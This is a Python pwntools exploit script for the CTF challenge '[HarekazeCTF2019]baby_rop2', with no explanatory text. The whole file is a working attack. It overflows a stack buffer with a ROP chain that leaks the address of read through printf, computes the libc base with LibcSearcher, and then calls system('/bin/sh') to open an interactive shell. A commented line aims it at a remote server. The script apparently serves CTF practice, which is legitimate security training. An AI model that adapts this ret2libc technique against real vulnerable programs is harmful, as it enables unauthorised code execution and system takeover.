from pwn import *
from LibcSearcher import *


def baby_rop2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/[HarekazeCTF2019]baby_rop2'):
    print('[HarekazeCTF2019]baby_rop2 start')
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    # target = remote('node4.buuoj.cn',26767)
    target_elf = ELF(file_name)

    main_addr = p64(target_elf.symbols['main'])
    read_got = p64(target_elf.got['read'])
    printf_got = p64(target_elf.got['printf'])
    printf_plt = p64(target_elf.plt['printf'])
    pop_ret_gadget = p64(0x400733)  # pop rdi ; ret
    pop2_ret_gadget = p64(0x400731)  # pop rsi ; pop r15 ; ret

    payload = b'a' * 40

    # printf("Welcome to the Pwn World again, %s!\n", read_got);
    payload += pop2_ret_gadget + read_got + p64(0xdeadbeef)
    payload += pop_ret_gadget + p64(0x400770) + printf_plt
    # printf("Welcome to the Pwn World again, %s!\n", printf_got);
    # payload += pop2_ret_gadget + printf_got + p64(0xdeadbeef)
    # payload += pop_ret_gadget + p64(0x400770) + printf_plt
    # main()
    payload += main_addr

    # gdb.attach(target)
    target.sendafter('What\'s your name? ', payload)
    target.recvuntil('Welcome to the Pwn World again, ')
    target.recvuntil('Welcome to the Pwn World again, ')
    read_addr = int.from_bytes(target.recv(6), 'little')
    # target.recvuntil('Welcome to the Pwn World again, ')
    # print(target.recv())
    # print(target.recv())
    # printf_addr = int.from_bytes(target.recv(6), 'little')

    print(hex(read_addr))
    # print(hex(printf_addr))

    searcher = LibcSearcher('read', read_addr)
    # searcher.add_condition('printf', printf_addr)

    libc_base = read_addr - searcher.dump('read')
    system_addr = p64(libc_base + searcher.dump('system'))
    bin_sh_addr = p64(libc_base + searcher.dump('str_bin_sh'))

    payload = b'a' * 40
    payload += pop_ret_gadget + bin_sh_addr + system_addr
    target.sendafter('What\'s your name? ', payload)

    target.interactive()
    print('[HarekazeCTF2019]baby_rop2 end')


if __name__ == '__main__':
    baby_rop2()
